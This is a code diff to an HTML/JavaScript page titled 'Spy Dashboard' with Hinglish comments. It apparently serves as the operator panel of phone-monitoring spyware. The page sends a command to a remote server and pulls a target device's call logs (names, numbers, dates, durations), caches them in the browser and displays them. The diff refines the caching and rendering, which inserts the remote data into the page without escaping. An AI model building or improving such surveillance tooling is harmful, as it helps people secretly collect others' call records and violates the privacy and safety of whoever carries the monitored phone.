@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Call Logs - Spy Dashboard</title>
+    <title>Call History - Spy Dashboard</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
@@ -21,7 +21,7 @@
             background-color: var(--bg-color);
             background-image: linear-gradient(45deg, #000000, #1a1a1a);
             color: var(--text-main);
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Segoe UI', sans-serif;
             margin: 0; padding: 20px;
             display: flex; justify-content: center;
         }
@@ -54,7 +54,14 @@
             color: white; padding: 8px 15px; border-radius: 20px; cursor: pointer;
         }
 
-        .log-list { display: flex; flex-direction: column; gap: 10px; max-height: 600px; overflow-y: auto; }
+        .log-list { 
+            display: flex; flex-direction: column; gap: 10px; 
+            max-height: 600px; overflow-y: auto; padding-right: 5px;
+        }
+        
+        /* Scrollbar Styling */
+        .log-list::-webkit-scrollbar { width: 5px; }
+        .log-list::-webkit-scrollbar-thumb { background: var(--glass-border); border-radius: 10px; }
 
         .log-card {
             background: var(--glass-bg); padding: 12px 15px;
@@ -64,17 +71,17 @@
         .log-card:hover { transform: translateX(3px); background: rgba(255,255,255,0.15); }
 
         .log-icon {
-            font-size: 1.2rem; margin-right: 15px; width: 35px; height: 35px;
+            font-size: 1rem; margin-right: 15px; width: 35px; height: 35px;
             display: flex; align-items: center; justify-content: center;
-            background: rgba(255,255,255,0.05); border-radius: 50%;
+            background: rgba(255,255,255,0.05); border-radius: 50%; flex-shrink: 0;
         }
         
         .log-icon.incoming { color: var(--incoming); }
         .log-icon.outgoing { color: var(--outgoing); }
         .log-icon.missed { color: var(--missed); }
 
-        .log-info { flex: 1; }
-        .log-number { font-size: 1rem; font-weight: 500; }
+        .log-info { flex: 1; overflow: hidden; }
+        .log-number { font-size: 1rem; font-weight: 500; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
         .log-meta { font-size: 0.75rem; color: var(--text-muted); margin-top: 4px; display: flex; gap: 10px; }
         
         .status-msg { text-align: center; color: var(--text-muted); margin-top: 50px; }
@@ -86,25 +93,48 @@
         <div class="header">
             <a href="index.html" class="back-btn"><i class="fa-solid fa-chevron-left"></i></a>
             <span class="page-title">Call History</span>
-            <button onclick="fetchLogs()" class="refresh-btn"><i class="fa-solid fa-rotate"></i></button>
+            <button onclick="fetchLogs()" class="refresh-btn" id="refreshBtn"><i class="fa-solid fa-rotate"></i></button>
         </div>
 
         <div class="log-list" id="logsContainer">
-            <div class="status-msg">
-                <i class="fa-solid fa-circle-notch fa-spin" style="font-size: 2rem; margin-bottom: 10px;"></i>
-                <p>Requesting Call Logs...</p>
             </div>
-        </div>
     </div>
 
     <script>
         const SERVER_URL = "https://child-v9no.onrender.com";
-        const DEVICE_ID = "M2103K19I";
+        
+        // --- LOGIC: URL se ID pakadna ---
+        const urlParams = new URLSearchParams(window.location.search);
+        const DEVICE_ID = urlParams.get('id');
+        const storageKey = `calls_${DEVICE_ID}`;
 
         document.addEventListener("DOMContentLoaded", () => {
+            if (!DEVICE_ID) {
+                alert("Bhai, ID missing hai! Dashboard se aao.");
+                window.location.href = "index.html";
+                return;
+            }
+
+            // 1. Pehle LocalStorage se purana data dikhao
+            loadFromStorage();
+
+            // 2. Command bhejo aur naya data lao
             sendCommand();
-            setTimeout(fetchLogs, 5000); // 5 sec baad check karo
+            setTimeout(fetchLogs, 3000); 
         });
+
+        function loadFromStorage() {
+            const savedData = localStorage.getItem(storageKey);
+            if (savedData) {
+                renderLogs(JSON.parse(savedData));
+            } else {
+                document.getElementById("logsContainer").innerHTML = `
+                    <div class="status-msg">
+                        <i class="fa-solid fa-circle-notch fa-spin" style="font-size: 2rem; margin-bottom: 10px;"></i>
+                        <p>Requesting Call Logs...</p>
+                    </div>`;
+            }
+        }
 
         function sendCommand() {
             fetch(`${SERVER_URL}/api/send-command`, {
@@ -115,73 +145,60 @@
         }
 
         function fetchLogs() {
-            const container = document.getElementById("logsContainer");
+            const btn = document.getElementById("refreshBtn");
+            btn.innerHTML = '<i class="fa-solid fa-sync fa-spin"></i>';
 
-            // ✅ CORRECTED: Direct file ki jagah API route use kar rahe hain
             fetch(`${SERVER_URL}/api/get-data/${DEVICE_ID}/call_logs?t=${new Date().getTime()}`)
-                .then(response => {
-                    if (!response.ok) throw new Error("No data");
-                    return response.json();
-                })
+                .then(response => response.json())
                 .then(data => {
-                    if (!data || data.length === 0) {
-                        container.innerHTML = `
-                            <div class='status-msg'>
-                                <i class="fa-solid fa-phone-slash"></i>
-                                <p>No call history found or phone hasn't uploaded yet.</p>
-                            </div>`;
-                        return;
+                    if (data && data.length > 0) {
+                        // 3. Naya data save aur display karo
+                        localStorage.setItem(storageKey, JSON.stringify(data));
+                        renderLogs(data);
                     }
-
-                    container.innerHTML = ""; // Clear Loading
-
-                    // Logs newest first dikhane ke liye reverse (agar app purane se bhej raha ho)
-                    data.forEach(log => {
-                        let iconClass = "incoming";
-                        let iconName = "fa-arrow-down-left";
-                        
-                        const type = (log.type || "").toLowerCase();
-
-                        if(type.includes("outgoing")) {
-                            iconClass = "outgoing";
-                            iconName = "fa-arrow-up-right";
-                        } else if(type.includes("missed") || type.includes("rejected")) {
-                            iconClass = "missed";
-                            iconName = "fa-phone-slash";
-                        }
-
-                        let displayDate = log.date;
-                        if (!isNaN(log.date)) {
-                            displayDate = new Date(parseInt(log.date)).toLocaleString();
-                        }
-
-                        const card = `
-                            <div class="log-card">
-                                <div class="log-icon ${iconClass}">
-                                    <i class="fa-solid ${iconName}"></i>
-                                </div>
-                                <div class="log-info">
-                                    <div class="log-number">${log.name || log.number || "Unknown"}</div>
-                                    <div class="log-meta">
-                                        <span>${displayDate || "Unknown Date"}</span>
-                                        <span>•</span>
-                                        <span>${log.duration || "0s"}</span>
-                                    </div>
-                                </div>
-                            </div>
-                        `;
-                        container.innerHTML += card;
-                    });
                 })
-                .catch(err => {
-                    console.log("Waiting for phone...");
-                    container.innerHTML = `
-                        <div class="status-msg">
-                            <i class="fa-solid fa-hourglass-start"></i>
-                            <p>Connecting to Phone...</p>
-                            <small>Fetching latest logs, please wait.</small>
-                        </div>`;
+                .finally(() => {
+                    btn.innerHTML = '<i class="fa-solid fa-rotate"></i>';
                 });
+        }
+
+        function renderLogs(data) {
+            const container = document.getElementById("logsContainer");
+            container.innerHTML = ""; 
+
+            data.forEach(log => {
+                let iconClass = "incoming";
+                let iconName = "fa-arrow-down-left";
+                const type = (log.type || "").toLowerCase();
+
+                if(type.includes("outgoing")) {
+                    iconClass = "outgoing";
+                    iconName = "fa-arrow-up-right";
+                } else if(type.includes("missed") || type.includes("rejected")) {
+                    iconClass = "missed";
+                    iconName = "fa-phone-slash";
+                }
+
+                let displayDate = log.date;
+                if (!isNaN(log.date)) {
+                    displayDate = new Date(parseInt(log.date)).toLocaleString();
+                }
+
+                container.innerHTML += `
+                    <div class="log-card">
+                        <div class="log-icon ${iconClass}">
+                            <i class="fa-solid ${iconName}"></i>
+                        </div>
+                        <div class="log-info">
+                            <div class="log-number">${log.name || log.number || "Unknown"}</div>
+                            <div class="log-meta">
+                                <span>${displayDate || "Unknown"}</span>
+                                <span>•</span>
+                                <span>${log.duration || "0s"}</span>
+                            </div>
+                        </div>
+                    </div>`;
+            });
         }
     </script>
 </body>
